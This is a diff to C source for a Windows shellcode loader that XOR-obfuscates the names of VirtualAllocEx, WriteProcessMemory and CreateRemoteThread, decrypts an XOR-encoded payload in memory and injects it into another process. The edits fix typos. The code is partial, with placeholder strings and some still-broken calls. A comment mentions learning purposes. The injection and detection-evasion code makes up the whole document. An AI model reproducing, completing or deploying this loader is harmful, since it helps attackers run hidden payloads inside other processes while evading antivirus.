@@ -9,7 +9,7 @@ LPVOID (WINAPI * pVirtualAllocEx) (HANDLE hProcess, LPVOID lpAddress, SIZE_T dwS
 
 BOOL (WINAPI * pWriteProcessMemory) (HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
 
-HANDLE (WINAPI * pCreateRemoteThread)(HANDLE hProcess, LPSECURITY_ATTRIBUTES  lpThreadAttributes, SIZE_T                 dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID                 lpParameter, DWORD                  dwCreationFlags, LPDWORD                lpThreadId);
+HANDLE (WINAPI * pCreateRemoteThread)(HANDLE hProcess, LPSECURITY_ATTRIBUTES  lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
 
 char key[] = "my_xor_key";
 
@@ -18,7 +18,7 @@ void XOR(char * data, size_t data_len, char * key, size_t key_len) {
 
         j = 0;
         for (int i = 0; i < data_len; i++) {
-                if (j == key_len - l) j = 0;
+                if (j == key_len - 1) j = 0;
 
                 data[i] = data[i] ^ key[j];
                 j++;
@@ -61,12 +61,12 @@ int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {
     HANDLE hTrhread = NULL;
 
     // xored function names
-    unsigned char  sVirtualAllocEx[] = {hex string from xor crypt of the function name}
-    unsigned char  sWriteProcessMemory[] = {hex string from xor crypt of the function name 
-    unsigned char  sCreateRemoteThread[] = {hex string from xor crypt of the function name}
+    unsigned char  sVirtualAllocEx[] = hex string from xor crypt of the function name
+    unsigned char  sWriteProcessMemory[] = hex string from xor crypt of the function name 
+    unsigned char  sCreateRemoteThread[] = hex string from xor crypt of the function name
 
     // decrypt xor here
-    XOR((char *) sVirtualAllocEx, sizeof(sVirtualAllocEx), key sizeof(key));
+    XOR((char *) sVirtualAllocEx, sizeof(sVirtualAllocEx), key, sizeof(key));
     XOR((char *) sWriteProcessMemory, sizeof(sWriteProcessMemory), key sizeof(key));
     XOR((char *) sCreateRemoteThread, sizeof(sCreateRemoteThread), key sizeof(key));
 
@@ -122,7 +122,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     RtlMoveMemory(exec_mem, payload, payload_len);
 
     // Decrypt payload (DeXOR)
-    XOR((char *) exec_mem, payload_len, key sizeof(key));
+    XOR((char *) exec_mem, payload_len, key, sizeof(key));
 
     // break point for learn propose
     //printf("\nHit me!\n");
